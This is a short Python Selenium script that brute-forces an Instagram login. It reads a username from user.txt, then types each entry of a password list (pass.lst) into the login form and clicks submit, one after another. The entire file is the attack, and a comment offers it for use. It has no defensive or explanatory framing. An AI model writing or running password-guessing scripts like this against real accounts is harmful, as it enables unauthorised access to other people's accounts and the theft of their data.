from selenium import webdriver
import time
from selenium.webdriver.common.keys import Keys


#get instagram page
browser = webdriver.Chrome()
browser.get("https://www.instagram.com")
time.sleep(3)


#get boxes then try pass.txt if succes y'll redirect into the homepage xD
username = browser.find_element_by_name("username")
password = browser.find_element_by_name("password")
login = browser.find_element_by_xpath("/html/body/div[1]/section/main/article/div[2]/div[1]/div/form/div[4]/button")
user_txt = open('user.txt','r')
for line2 in user_txt:	
	username.send_keys(line2)
	break
pass_lst = open('pass.lst','r')

time.sleep(1)

for line in pass_lst:	
	time.sleep(1)
	password.send_keys(Keys.CONTROL,'a')
	password.send_keys(line)
	time.sleep(1)
	login.click()


time.sleep(3)
pass_lst.close()
user_txt.close()
#end
browser.close()
